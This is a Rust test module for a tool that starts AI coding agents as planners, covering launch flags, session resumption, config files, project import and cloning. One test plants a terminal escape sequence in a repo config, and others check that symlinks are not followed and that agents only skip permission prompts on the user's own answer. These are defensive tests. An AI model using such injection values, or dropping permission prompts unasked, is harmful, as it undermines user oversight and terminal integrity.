        assert_eq!(entry.command_with(Some("u"), Prompts::Skip), format!("/bin/claude --dangerously-skip-permissions --session-id u {}", told_task(Some("go"))));
        entry.agent = "codex".into();
        assert_eq!(entry.command_with(None, Prompts::Ask), format!("codex --no-daemon {}", told_task(Some("go"))));
        entry.agent = "claude --permission-mode plan".into();
        assert_eq!(entry.command_with(None, Prompts::Skip), format!("claude --permission-mode plan {}", told_task(Some("go"))), "a command that picks its own mode keeps it");
    }


    #[test]
    fn opencode_sessions_are_found_by_worktree() {
        let dir = std::env::temp_dir().join(format!("kanna-sessions-{}", std::process::id()));
        let (here, there) = (dir.join("here"), dir.join("there"));
        fs::create_dir_all(&here).unwrap();
        let db = dir.join("opencode.db");
        let setup = format!(
            "create table session (id text, parent_id text, directory text, time_updated integer, time_archived integer); insert into session values ('ses_old', null, '{h}', 1, null), ('ses_new', null, '{h}', 2, null), ('ses_child', 'ses_new', '{h}', 3, null), ('ses_other', null, '{t}', 4, null);",
            h = here.display(),
            t = there.display()
        );
        assert!(Command::new("/usr/bin/sqlite3").arg(&db).arg(setup).status().unwrap().success());
        assert_eq!(latest_opencode_session(&db, &here), Some("ses_new".into()));
        assert_eq!(latest_opencode_session(&db, &dir.join("nowhere")), None);
        assert_eq!(latest_opencode_session(&dir.join("missing.db"), &here), None);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn each_agent_starts_as_the_planner_as_you_d_start_it_with_its_first_message() {
        let agents = planner_agents(None);
        let names: Vec<&str> = agents.iter().map(|(n, _, _, _)| n.as_str()).collect();
        assert_eq!(names, ["claude", "codex", "opencode", "agy"]);
        let asking = |name: &str| agents.iter().find(|(n, _, _, _)| n == name).unwrap().2.clone();
        assert_eq!(asking("claude"), "claude 'You are the Kanna planning agent.'", "no session");
        assert_eq!(asking("codex"), "codex --no-daemon 'You are the Kanna planning agent.'");
        let start = |name: &str| agents.iter().find(|(n, _, _, _)| n == name).unwrap().3.clone();
        assert_eq!(start("claude"), "claude --dangerously-skip-permissions 'You are the Kanna planning agent.'", "no session; no permission prompts, as a task's agent");
        assert_eq!(start("codex"), "codex --yolo --no-daemon 'You are the Kanna planning agent.'");
        assert_eq!(start("opencode"), "opencode --prompt 'You are the Kanna planning agent.'");
        assert_eq!(start("agy"), "agy --dangerously-skip-permissions -i 'You are the Kanna planning agent.'");
        assert_eq!(started_as("/opt/bin/codex", PLANNER_ROLE, None, Prompts::Skip), "/opt/bin/codex --yolo --no-daemon 'You are the Kanna planning agent.'");
        assert_eq!(started_as("/x/mock-agent", PLANNER_ROLE, Some(300_000), Prompts::Skip), "/x/mock-agent 'You are the Kanna planning agent.'");
        assert_eq!(started_as("codex", PLANNER_ROLE, Some(300_000), Prompts::Skip), "codex --yolo -c model_auto_compact_token_limit=300000 --no-daemon 'You are the Kanna planning agent.'", "codex compacts at planning.context too");
        assert_eq!(started_as("claude", PLANNER_ROLE, Some(300_000), Prompts::Skip), "claude --dangerously-skip-permissions 'You are the Kanna planning agent.'", "claude's is the terminal's CLAUDE_CODE_AUTO_COMPACT_WINDOW");
    }

    #[test]
    fn a_planner_starts_in_a_session_of_its_own_and_comes_back_to_it_without_its_first_message() {
        assert_eq!(started_in("claude", PLANNER_ROLE, None, Prompts::Skip, Some("u-1")), "claude --dangerously-skip-permissions --session-id 'u-1' 'You are the Kanna planning agent.'");
        assert_eq!(started_in("agy", PLANNER_ROLE, None, Prompts::Skip, Some("u-1")), "agy --dangerously-skip-permissions -i 'You are the Kanna planning agent.'", "agy takes no session ID");
        assert_eq!(started_in("codex", PLANNER_ROLE, Some(300_000), Prompts::Skip, Some("u-1")), "codex --yolo -c model_auto_compact_token_limit=300000 --no-daemon 'You are the Kanna planning agent.'", "codex takes no session ID");
        assert_eq!(resumed_as("claude", Some(300_000), Prompts::Skip, "u-1"), "claude --dangerously-skip-permissions --resume 'u-1'");
        assert_eq!(resumed_as("codex", Some(300_000), Prompts::Skip, "u-1"), "codex --yolo -c model_auto_compact_token_limit=300000 --no-daemon resume 'u-1'");
        assert_eq!(resumed_as("opencode", None, Prompts::Skip, "u-1"), "opencode --session 'u-1'");
        assert_eq!(resumed_as("/x/bin/claude", None, Prompts::Skip, "u-1"), "/x/bin/claude --dangerously-skip-permissions --resume 'u-1'");
    }

    #[test]
    fn a_planner_comes_back_to_its_project_s_conversation_unless_another_window_is_in_it() {
        let kept = |agent: &str, session: Option<&str>, pane: &str, running: bool| json!({ "agent": agent, "session": opt(session), "started": 1_700_000_000.0, "pane": pane, "running": running });
        let none = |_: SystemTime| None;
        let live = |pane: &str| pane == "term-2";
        assert_eq!(comeback(None, "claude", "term-1", live, none), Comeback::New);
        assert_eq!(comeback(Some(&kept("claude", Some("s"), "term-9", true)), "claude", "term-1", live, none), Comeback::Resume("s".into()), "its terminal is gone");
        assert_eq!(comeback(Some(&kept("claude", Some("s"), "term-1", true)), "claude", "term-1", live, none), Comeback::Resume("s".into()), "restarted in the same terminal");
        assert_eq!(comeback(Some(&kept("claude", Some("s"), "term-2", true)), "claude", "term-1", live, none), Comeback::Busy, "another window's planner is in it");
        assert_eq!(comeback(Some(&kept("claude", Some("s"), "term-2", false)), "claude", "term-1", live, none), Comeback::Resume("s".into()), "that planner quit its agent");
        assert_eq!(comeback(Some(&kept("claude", Some("s"), "term-9", true)), "codex", "term-1", live, none), Comeback::New, "another agent's conversation");
        let found = |since: SystemTime| (since == UNIX_EPOCH + Duration::from_secs(1_700_000_000)).then(|| "found".to_string());
        assert_eq!(comeback(Some(&kept("codex", None, "term-9", true)), "codex", "term-1", live, found), Comeback::Resume("found".into()), "found from when it started");
        assert_eq!(comeback(Some(&kept("agy", None, "term-9", true)), "agy", "term-1", live, none), Comeback::Lost);
    }

    #[test]
    fn a_codex_planner_s_session_is_the_first_rollout_in_the_project_since_it_started() {
        let dir = std::env::temp_dir().join(format!("kanna-first-codex-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        let day = dir.join("2026/10/28");
        fs::create_dir_all(&day).unwrap();
        let (project, other) = (dir.join("app"), dir.join("other"));
        fs::create_dir_all(&project).unwrap();
        fs::create_dir_all(&other).unwrap();
        let rollout = |name: &str, id: &str, cwd: &Path| {
            fs::write(day.join(format!("rollout-{name}-{id}.jsonl")), format!("{}\n", json!({ "type": "session_meta", "payload": { "id": id, "cwd": cwd } }))).unwrap();
            std::thread::sleep(Duration::from_millis(20));
        };
        rollout("1", "before", &project);
        std::thread::sleep(Duration::from_millis(20));
        let since = SystemTime::now();
        rollout("2", "elsewhere", &other);
        rollout("3", "planner", &project);
        rollout("4", "later", &project);
        assert_eq!(first_codex_session(&dir, &project, since).as_deref(), Some("planner"));
        assert_eq!(first_codex_session(&dir, &project, SystemTime::now()), None);
        assert_eq!(first_codex_session(&dir, &dir.join("none"), since), None);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn the_planner_script_starts_what_the_daemon_says_and_tells_it_the_agent_quit() {
        let p = planner("comeback", &["claude"]);
        let repo = p.repo("app");
        let kanna = p.bin.join("kanna");
        let asked = p.root.join("asked");
        stub(&kanna, &format!("[ \"$1\" = raw ] || exit 0\nprintf '%s\\n' \"$2\" >>'{}'\ncase $2 in\n  *'\"start\"'*) echo '{{\"command\":\"claude --resume s-1\",\"said\":\"Back to app'\\''s planning conversation.\",\"after\":\"999999\"}}' ;;\n  *'\"quit\"'*) echo '{{\"again\":\"claude --resume s-2\"}}' ;;\nesac", asked.display()));
        let out = p.run_in(&repo, "", Some(&kanna), Some("term-7"));
        assert!(out.contains("Back to app's planning conversation.\n\nclaude in ROOT/home/.kanna-v4/repos/local/app: --resume s-1\n"), "{out}");
        assert!(out.contains("The planning agent quit. Start it again: claude --resume s-2\n"), "{out}");
        let mut requests: Vec<Value> = fs::read_to_string(&asked).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
        for request in &mut requests {
            let group = request["args"].as_object_mut().unwrap().remove("group").unwrap();
            assert!(group.as_str().unwrap().parse::<u32>().is_ok(), "its process group: {group}");
        }
        let folder = repo.to_string_lossy();
        assert_eq!(requests, [json!({ "cmd": "tasks", "args": { "action": "planner", "step": "start", "pane": "term-7", "folder": folder, "agent": "claude" } }), json!({ "cmd": "tasks", "args": { "action": "planner", "step": "quit", "pane": "term-7", "folder": folder, "agent": "claude" } })]);

        stub(&kanna, "exit 1");
        let out = p.run_in(&repo, "", Some(&kanna), Some("term-7"));
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: --dangerously-skip-permissions You are the Kanna planning agent.\n"), "without the daemon it starts as before: {out}");
    }

    #[test]
    fn the_planning_terminal_keeps_claude_to_its_context_and_runs_the_planner_script() {
        let agents = [("claude".to_string(), "claude".to_string(), "claude 'You are the Kanna planning agent.'".to_string(), "claude --dangerously-skip-permissions 'You are the Kanna planning agent.'".to_string())];
        let command = planner_command(Some("/K/planner.sh"), Some(300_000), Some("/S/shell/zsh"), Some("/A/kanna"), Path::new("/H/.kanna-v4/repos"), &agents);
        assert_eq!(command, r#"[ -n "$CLAUDE_CODE_AUTO_COMPACT_WINDOW" ] || export CLAUDE_CODE_AUTO_COMPACT_WINDOW=300000; exec '/K/planner.sh' --kanna '/A/kanna' --zsh '/S/shell/zsh' --repos '/H/.kanna-v4/repos' -- 'claude' 'claude' 'claude '\''You are the Kanna planning agent.'\''' 'claude --dangerously-skip-permissions '\''You are the Kanna planning agent.'\'''"#);
        assert!(!command.contains("KANNA_PLANNER"));
        assert_eq!(planner_command(None, None, None, None, Path::new("/r"), &agents), "exec \"${SHELL:-/bin/sh}\" -l");
        assert_eq!(planner_command(None, None, None, Some("/A/kanna"), Path::new("/r"), &agents), "'/A/kanna' agents setup --ask; '/A/kanna' agents update --ask; exec \"${SHELL:-/bin/sh}\" -l");
        let run = |extra: &[(&str, &str)]| {
            let mut sh = Command::new("/bin/sh");
            sh.arg("-c").arg(planner_command(None, Some(300_000), None, None, Path::new("/r"), &[]).replace("exec \"${SHELL:-/bin/sh}\" -l", "echo \"C=$CLAUDE_CODE_AUTO_COMPACT_WINDOW\"")).env_remove("CLAUDE_CODE_AUTO_COMPACT_WINDOW");
            sh.envs(extra.iter().copied());
            String::from_utf8_lossy(&sh.output().unwrap().stdout).trim().to_string()
        };
        assert_eq!(run(&[]), "C=300000");
        assert_eq!(run(&[("CLAUDE_CODE_AUTO_COMPACT_WINDOW", "500000")]), "C=500000", "your own setting wins");
    }

    struct Planner {
        root: PathBuf,
        home: PathBuf,
        bin: PathBuf,
    }

    impl Drop for Planner {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.root);
        }
    }

    fn stub(file: &Path, body: &str) {
        fs::write(file, format!("#!/bin/sh\n{body}\n")).unwrap();
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(file, fs::Permissions::from_mode(0o755)).unwrap();
    }

    fn planner(name: &str, installed: &[&str]) -> Planner {
        let root = std::env::temp_dir().join(format!("kanna-planner-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        let (home, bin) = (root.join("home"), root.join("bin"));
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&bin).unwrap();
        for agent in installed {
            stub(&bin.join(agent), "echo \"$(basename \"$0\") in $(pwd -P): $*\"");
        }
        stub(&bin.join("shell"), "echo \"shell in $(pwd -P)\"");
        fs::create_dir_all(home.join(".kanna-v4")).unwrap();
        fs::write(home.join(".kanna-v4/config.json"), r#"{"agents": {"prompts": "skip"}}"#).unwrap();
        let root = root.canonicalize().unwrap();
        Planner { home: root.join("home"), bin: root.join("bin"), root }
    }

    impl Planner {
        fn repo(&self, name: &str) -> PathBuf {
            self.repo_at(&self.home.join(".kanna-v4/repos/local").join(name))
        }

        fn repo_at(&self, repo: &Path) -> PathBuf {
            let repo = repo.to_path_buf();
            fs::create_dir_all(&repo).unwrap();
            assert!(Command::new("git").args(["init", "-q"]).current_dir(&repo).status().unwrap().success());
            repo
        }

        fn run(&self, folder: &Path, input: &str) -> String {
            self.run_with(folder, input, None)
        }

        fn run_with(&self, folder: &Path, input: &str, kanna: Option<&Path>) -> String {
            self.run_in(folder, input, kanna, None)
        }

        fn run_in(&self, folder: &Path, input: &str, kanna: Option<&Path>, terminal: Option<&str>) -> String {
            let script = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../apps/kanna/Resources/planner.sh");
            let mut args = vec!["--repos".to_string(), self.home.join(".kanna-v4/repos").to_string_lossy().into_owned()];
            if let Some(kanna) = kanna {
                args.extend(["--kanna".to_string(), kanna.to_string_lossy().into_owned()]);
            }
            args.push("--".to_string());
            for agent in ["claude", "codex", "opencode"] {
                args.push(agent.to_string());
                args.push(agent.to_string());
                args.push(started_as(agent, PLANNER_ROLE, None, Prompts::Ask));
                args.push(started_as(agent, PLANNER_ROLE, None, Prompts::Skip));
            }
            let mut child = Command::new(&script)
                .args(&args)
                .current_dir(folder)
                .env_clear()
                .env("HOME", &self.home)
                .env("PATH", format!("{}:/usr/bin:/bin", self.bin.display()))
                .env("SHELL", self.bin.join("shell"))
                .envs(terminal.map(|t| ("KANNA_TERMINAL", t)))
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .spawn()
                .unwrap();
            use std::io::Write;
            child.stdin.take().unwrap().write_all(input.as_bytes()).unwrap();
            let out = String::from_utf8(child.wait_with_output().unwrap().stdout).unwrap();
            out.replace(self.root.to_str().unwrap(), "ROOT")
        }
    }

    #[test]
    fn the_planner_script_asks_which_agent_saves_it_as_the_project_s_and_starts_it() {
        let p = planner("ask", &["claude", "codex"]);
        let repo = p.repo("app");
        let out = p.run(&repo, "2\n");
        assert!(out.contains("Choose an agent for planning and task creation\n\n  1  claude\n  2  codex\n\nChoose [1]: codex plans app from now on (planning.agent in .kanna/config.json).\n"), "{out}");
        assert!(out.contains("codex in ROOT/home/.kanna-v4/repos/local/app: --yolo --no-daemon You are the Kanna planning agent.\n"), "{out}");
        assert!(out.contains("The planning agent quit. Start it again: codex --yolo --no-daemon 'You are the Kanna planning agent.'\nshell in ROOT/home/.kanna-v4/repos/local/app\n"), "{out}");
        let config: Value = serde_json::from_str(&fs::read_to_string(repo.join(".kanna/config.json")).unwrap()).unwrap();
        assert_eq!(config, json!({ "version": 1, "planning": { "agent": "codex" } }));
        assert_eq!(planning_context(&[repo.join(".kanna/config.json")]), Some(PLANNING_CONTEXT), "the daemon still reads the file");

        let out = p.run(&repo, "");
        assert!(!out.contains("Choose"), "the project's planner starts without asking: {out}");
        assert!(out.contains("codex in ROOT/home/.kanna-v4/repos/local/app: --yolo --no-daemon You are the Kanna planning agent."), "{out}");

        let other = p.repo("other");
        let out = p.run(&other, "\n");
        assert!(out.contains("Choose [1]: claude plans other from now on (planning.agent in .kanna/config.json).\n"), "Return takes the first and saves it: {out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/other: --dangerously-skip-permissions You are the Kanna planning agent."), "{out}");
        let config: Value = serde_json::from_str(&fs::read_to_string(other.join(".kanna/config.json")).unwrap()).unwrap();
        assert_eq!(config, json!({ "version": 1, "planning": { "agent": "claude" } }));
    }

    #[test]
    fn the_planner_script_asks_once_whether_agents_skip_permission_prompts() {
        let p = planner("prompts", &["claude", "codex"]);
        let mine = p.home.join(".kanna-v4/config.json");
        fs::remove_dir_all(p.home.join(".kanna-v4")).unwrap();
        let repo = p.repo("app");
        let question = "Let Kanna's agents work without permission prompts? They'll run commands and edit files without asking. [y/N]";
        let out = p.run(&repo, "1\n\n");
        assert!(out.contains(&format!("Choose [1]: claude plans app from now on (planning.agent in .kanna/config.json).\n\n{question} Kanna's agents ask permission from now on (agents.prompts in ~/.kanna-v4/config.json).\n")), "after the agent is chosen: {out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: You are the Kanna planning agent.\n"), "{out}");
        let config: Value = serde_json::from_str(&fs::read_to_string(&mine).unwrap()).unwrap();
        assert_eq!(config, json!({ "version": 1, "agents": { "prompts": "ask" } }));
        assert_eq!(prompts(&[mine.clone()]), Prompts::Ask);

        let out = p.run(&repo, "");
        assert!(!out.contains("permission prompts?"), "asked once: {out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: You are the Kanna planning agent.\n"), "{out}");

        fs::write(&mine, r#"{"$schema": "x", "version": 1, "planning": {"context": 400000}}"#).unwrap();
        let out = p.run(&repo, "y\n");
        assert!(out.contains("Kanna's agents work without permission prompts from now on (agents.prompts in ~/.kanna-v4/config.json)."), "{out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: --dangerously-skip-permissions You are the Kanna planning agent.\n"), "{out}");
        let config: Value = serde_json::from_str(&fs::read_to_string(&mine).unwrap()).unwrap();
        assert_eq!(config, json!({ "$schema": "x", "version": 1, "planning": { "context": 400000 }, "agents": { "prompts": "skip" } }), "the file's other keys stay");
        assert_eq!(prompts(&[mine.clone()]), Prompts::Skip);

        let cloned = p.repo("cloned");
        fs::create_dir_all(cloned.join(".kanna")).unwrap();
        fs::write(cloned.join(".kanna/config.json"), r#"{"planning": {"agent": "claude"}, "agents": {"prompts": "ask"}}"#).unwrap();
        fs::write(&mine, r#"{"version": 1}"#).unwrap();
        let out = p.run(&cloned, "y\n");
        assert!(out.contains(question) && out.contains("claude in ROOT/home/.kanna-v4/repos/local/cloned: --dangerously-skip-permissions You are"), "a repo's file doesn't answer for you: {out}");

        fs::remove_file(&mine).unwrap();
        std::os::unix::fs::symlink(p.home.join("elsewhere"), &mine).unwrap();
        let out = p.run(&cloned, "y\n");
        assert!(out.contains("Couldn't write ~/.kanna-v4/config.json.") && out.contains("claude in ROOT/home/.kanna-v4/repos/local/cloned: --dangerously-skip-permissions You are"), "a symlink isn't followed, and the answer still holds: {out}");
        assert!(!p.home.join("elsewhere").exists());
    }

    #[test]
    fn the_planner_script_keeps_the_rest_of_the_project_s_settings() {
        let p = planner("keep", &["claude", "codex"]);
        let repo = p.repo("app");
        fs::create_dir_all(repo.join(".kanna")).unwrap();
        fs::write(repo.join(".kanna/config.json"), r#"{"$schema": "x", "version": 1, "planning": {"context": 400000}}"#).unwrap();
        p.run(&repo, "1\n");
        let config: Value = serde_json::from_str(&fs::read_to_string(repo.join(".kanna/config.json")).unwrap()).unwrap();
        assert_eq!(config, json!({ "$schema": "x", "version": 1, "planning": { "context": 400000, "agent": "claude" } }));

        let cloned = p.repo("cloned");
        fs::create_dir_all(cloned.join(".kanna")).unwrap();
        std::os::unix::fs::symlink(p.home.join("elsewhere"), cloned.join(".kanna/config.json")).unwrap();
        let out = p.run(&cloned, "1\n");
        assert!(out.contains("Couldn't write ROOT/home/.kanna-v4/repos/local/cloned/.kanna/config.json."), "a repo's symlink isn't followed: {out}");
        assert!(!p.home.join("elsewhere").exists());
        fs::write(cloned.join(".kanna/config.json.real"), "{\"version\": 1, \"planning\": {\"agent\": \"evil\\u001b]0;x\\u0007\"}}").unwrap();
        fs::remove_file(cloned.join(".kanna/config.json")).unwrap();
        fs::rename(cloned.join(".kanna/config.json.real"), cloned.join(".kanna/config.json")).unwrap();
        let out = p.run(&cloned, "1\n");
        assert!(out.contains("planning.agent is evil]0;x, which isn't installed.") && !out.contains('\u{7}'), "a repo's text can't drive the terminal: {out:?}");
    }

    #[test]
    fn the_planner_script_doesn_t_ask_with_one_agent_and_says_so_with_none() {
        let p = planner("one", &["claude"]);
        let repo = p.repo("app");
        let out = p.run(&repo, "");
        assert!(!out.contains("Choose") && out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: --dangerously-skip-permissions You are the Kanna planning agent."), "{out}");
        let p = planner("none", &[]);
        let repo = p.repo("app");
        let out = p.run(&repo, "");
        assert_eq!(out, "No agent Kanna knows is installed (claude, codex, opencode or agy). Install one, then start it here.\nshell in ROOT/home/.kanna-v4/repos/local/app\n");
    }

    #[test]
    fn in_home_the_planner_script_asks_where_first() {
        let p = planner("where", &["claude", "codex"]);
        let out = p.run(&p.home, "recipe-box\n2\n");
        assert!(out.contains("Folder, repo or name: Made ~/.kanna-v4/repos/local/recipe-box\n"), "{out}");
        assert!(out.contains("\u{1b}]7;file://localhostROOT/home/.kanna-v4/repos/local/recipe-box\u{1b}\\"), "the window follows: {out}");
        assert!(!out.contains("plans recipe-box"), "a new project isn't a repo, so nothing is saved: {out}");
        assert!(out.contains("codex in ROOT/home/.kanna-v4/repos/local/recipe-box: --yolo --no-daemon You are the Kanna planning agent.") && out.ends_with("shell in ROOT/home/.kanna-v4/repos/local/recipe-box\n"), "{out}");
        let out = p.run(&p.home, "recipe-box\n1\n");
        assert!(out.contains("Opened ~/.kanna-v4/repos/local/recipe-box\n"), "{out}");

        let repo = p.repo("app");
        p.repo_at(&p.root.join("work/app"));
        let out = p.run(&p.home, "~/nowhere\nbad name!\n../work/app\n.kanna-v4/repos/local/app\n1\n");
        assert!(out.contains("No folder ~/nowhere.") && out.contains("A project's name is letters, digits"), "{out}");
        assert!(out.contains("ROOT/work/app isn't in ~/.kanna-v4/repos, where Kanna keeps its projects so each has the same place on every machine.\nImport a copy there: kanna project import ROOT/work/app\nFolder, repo or name: "), "a folder outside repos is refused: {out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: --dangerously-skip-permissions You are"), "a folder is moved to: {out}");
        let out = p.run(&p.home, &format!("{}\n1\n", repo.display()));
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: --dangerously-skip-permissions You are"), "{out}");
        let out = p.run(&repo, "1\n");
        assert!(!out.contains("Folder, repo or name"), "only in ~: {out}");
    }

    #[test]
    fn a_planning_terminal_outside_repos_offers_to_import_the_project_and_stays_if_not() {
        let p = planner("outside", &["claude"]);
        let app = p.repo_at(&p.root.join("work/app"));
        let out = p.run(&app, "");
        assert!(out.starts_with("ROOT/work/app isn't in ~/.kanna-v4/repos, where Kanna keeps its projects so each has the same place on every machine.\nImport a copy there: kanna project import ROOT/work/app\n"), "{out}");
        assert!(!out.contains("Folder, repo or name") && out.contains("claude in ROOT/work/app:"), "without the import it stays, so the window keeps its project: {out}");
        let kanna = p.bin.join("kanna");
        let (asked, never) = (p.root.join("asked"), p.root.join("never"));
        stub(
            &kanna,
            &format!(
                "case \"$1 $2\" in\n'project import') echo \"$KANNA_TERMINAL $(pwd -P) $3\" >'{asked}'; mkdir -p \"$HOME/.kanna-v4/repos/local\" && cp -R \"$3\" \"$HOME/.kanna-v4/repos/local/${{3##*/}}\" && echo imported; exit ;;\nesac\ncase \"$1 $2\" in\n*'\"never\"'*) echo \"$2\" >'{never}'; echo '{{\"never\":true}}' ;;\n*'\"asked\"'*) [ -e '{never}' ] && echo '{{\"never\":true}}' || echo '{{\"never\":false}}' ;;\nesac\nexit 0",
                asked = asked.display(),
                never = never.display()
            ),
        );
        for _ in 0..2 {
            let out = p.run_in(&app, "n\n", Some(&kanna), Some("term-7"));
            assert!(out.contains("Import it into ~/.kanna-v4/repos/local/app now? [Y/n/never] \n") && out.contains("claude in ROOT/work/app:"), "no stays, and asks again next time: {out}");
        }
        let out = p.run_in(&app, "\n", Some(&kanna), Some("term-7"));
        assert!(out.contains("Import it into ~/.kanna-v4/repos/local/app now? [Y/n/never] \u{1b}]7;file://localhostROOT/home\u{1b}\\imported\n"), "Return imports, and it leaves the project first, so the import doesn't stop it: {out}");
        assert_eq!(fs::read_to_string(&asked).unwrap(), "term-7 ROOT/home ROOT/work/app\n".replace("ROOT", p.root.to_str().unwrap()));
        assert!(out.contains("\u{1b}]7;file://localhostROOT/home/.kanna-v4/repos/local/app\u{1b}\\") && out.contains("claude in ROOT/home/.kanna-v4/repos/local/app:"), "it starts the agent in the copy, and the window follows: {out}");
        assert!(app.join(".git").is_dir(), "the original stays");

        let other = p.repo_at(&p.root.join("work/other"));
        let out = p.run_in(&other, "never\n", Some(&kanna), Some("term-7"));
        assert!(out.contains("[Y/n/never] Kanna won't ask again for ROOT/work/other. Import it any time: kanna project import ROOT/work/other\n") && out.contains("claude in ROOT/work/other:"), "{out}");
        let remembered: Value = serde_json::from_str(&fs::read_to_string(&never).unwrap()).unwrap();
        assert_eq!(remembered, json!({ "cmd": "project", "args": { "action": "never", "path": other } }), "the daemon remembers it");
        let out = p.run_in(&other, "", Some(&kanna), Some("term-7"));
        assert!(out.starts_with("ROOT/work/other is outside ~/.kanna-v4/repos, so its tasks don't start. Import it: kanna project import ROOT/work/other\n") && !out.contains("[Y/n") && out.contains("claude in ROOT/work/other:"), "never: a line, no question: {out}");
        let out = p.run_with(&p.home, &format!("{}\nn\nrecipe-box\n", other.display()), Some(&kanna));
        assert!(out.contains("Import it into ~/.kanna-v4/repos/local/other now? [Y/n] Folder, repo or name: Made"), "chosen in ~, it's asked without never, and no asks again: {out}");
        stub(&kanna, "[ \"$1 $2\" = 'project import' ] || exit 0\necho 'kanna: ~/x and ~/y are both clones' >&2; exit 1");
        let out = p.run_with(&p.home, &format!("{}\ny\nrecipe-box\n", other.display()), Some(&kanna));
        assert!(out.contains("kanna: ~/x and ~/y are both clones\n\u{1b}]7;file://localhostROOT/home\u{1b}\\Folder, repo or name: Opened"), "a refused import says why and asks again: {out}");
    }

    #[test]
    fn in_home_the_planner_script_numbers_the_recent_projects_and_return_takes_the_latest() {
        let p = planner("recent", &["claude"]);
        let (app, tool) = (p.repo("app"), p.repo("tool"));
        let gone = p.home.join(".kanna-v4/repos/local/gone");
        let kanna = p.bin.join("kanna");
        let list = p.root.join("projects");
        stub(&kanna, &format!("[ \"$1 $2\" = 'projects --json' ] && cat '{}'; exit 0", list.display()));
        let listed = |projects: &[(&Path, &str)]| fs::write(&list, json!({ "projects": projects.iter().map(|(path, label)| json!({ "path": path, "label": label, "at": 1 })).collect::<Vec<_>>() }).to_string()).unwrap();
        listed(&[(&app, "app"), (&tool, "~/work/tool"), (&gone, "gone")]);
        let out = p.run_with(&p.home, "\n", Some(&kanna));
        assert!(out.contains("Recent:\n  1  app\n  2  ~/work/tool\n  3  gone\n\nFolder, repo, name or number [1]: "), "the daemon's labels: {out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/app: --dangerously-skip-permissions You are"), "Return takes 1: {out}");
        assert!(out.contains("\u{1b}]7;file://localhostROOT/home/.kanna-v4/repos/local/app\u{1b}\\"), "the window follows: {out}");
        let out = p.run_with(&p.home, "4\n0\n3\n2\n", Some(&kanna));
        assert!(out.contains("Choose 1 to 3, or a folder, repo or name.") && out.contains("No folder ~/.kanna-v4/repos/local/gone."), "{out}");
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/tool: --dangerously-skip-permissions You are"), "{out}");
        let out = p.run_with(&p.home, "recipe-box\n", Some(&kanna));
        assert!(out.contains("Made ~/.kanna-v4/repos/local/recipe-box") && out.contains("claude in ROOT/home/.kanna-v4/repos/local/recipe-box"), "a name still works: {out}");
        let spaced = p.home.join(".kanna-v4/repos/local/my app");
        fs::create_dir_all(&spaced).unwrap();
        listed(&[(&spaced, "my app")]);
        let out = p.run_with(&p.home, "1\n", Some(&kanna));
        assert!(out.contains("claude in ROOT/home/.kanna-v4/repos/local/my app: "), "a path with a space: {out}");
        listed(&[]);
        let out = p.run_with(&p.home, "\nrecipe-box\n", Some(&kanna));
        assert!(!out.contains("Recent:") && out.contains("Folder, repo or name: Folder, repo or name: Opened ~/.kanna-v4/repos/local/recipe-box"), "with none it asks as before: {out}");
        let out = p.run_with(&app, "", Some(&kanna));
        assert!(!out.contains("Recent:"), "only in ~: {out}");
    }

    #[test]
    fn in_home_the_planner_script_clones_a_url_or_owner_repo() {
        let p = planner("clone", &["claude", "codex"]);
        let source = p.repo_at(&p.root.join("source"));
        assert!(Command::new("git").args(["-c", "user.email=e@e", "-c", "user.name=e", "commit", "-q", "--allow-empty", "-m", "first"]).current_dir(&source).status().unwrap().success());
        let bare = p.root.join("remote/kojo.git");
        assert!(Command::new("git").args(["clone", "-q", "--bare"]).arg(&source).arg(&bare).status().unwrap().success());
        let url = format!("file://{}", bare.display());
        let out = p.run(&p.home, &format!("{url}\n2\n"));
        assert!(out.contains("Cloning file://ROOT/remote/kojo.git into ~/.kanna-v4/repos/local/kojo…"), "{out}");
        assert!(out.contains("codex plans kojo from now on"), "a clone is a repo: {out}");
        assert!(out.contains("codex in ROOT/home/.kanna-v4/repos/local/kojo: --yolo --no-daemon"), "{out}");
        let out = p.run(&p.home, &format!("{url}\n2\n"));
        assert!(out.contains("Opened ~/.kanna-v4/repos/local/kojo (already cloned)"), "{out}");

        let out = p.run(&p.home, "someone/tool\nrecipe\n1\n");
        assert!(out.contains("gh isn't installed: give the repo's URL.") && out.contains("Made ~/.kanna-v4/repos/local/recipe"), "{out}");
        stub(&p.bin.join("gh"), &format!("[ \"$1 $2 $3\" = \"repo clone someone/tool\" ] && git clone -q {url} \"$4\""));
        let out = p.run(&p.home, "someone/tool\n1\n");
        assert!(out.contains("Cloning someone/tool into ~/.kanna-v4/repos/someone/tool…") && out.contains("claude in ROOT/home/.kanna-v4/repos/someone/tool: --dangerously-skip-permissions You are"), "{out}");
        p.repo_at(&p.home.join(".kanna-v4/repos/other/kojo"));
        let out = p.run(&p.home, "other/kojo\n1\n");
        assert!(out.contains("~/.kanna-v4/repos/other/kojo is already there, and isn't a clone of other/kojo."), "{out}");
        for (url, place) in [("https://example.invalid/team/site.git", "team/site"), ("git@example.invalid:team/site.git", "team/site"), ("ssh://git@example.invalid:22/team/site", "team/site"), ("git@example.invalid:site.git", "example.invalid/site")] {
            let out = p.run(&p.home, &format!("{url}\nrecipe\n1\n"));
            assert!(out.contains(&format!("Cloning {url} into ~/.kanna-v4/repos/{place}…")), "{url}: {out}");
        }
    }

    #[test]
    fn the_settings_schema_agents_read_matches_what_the_daemon_reads() {
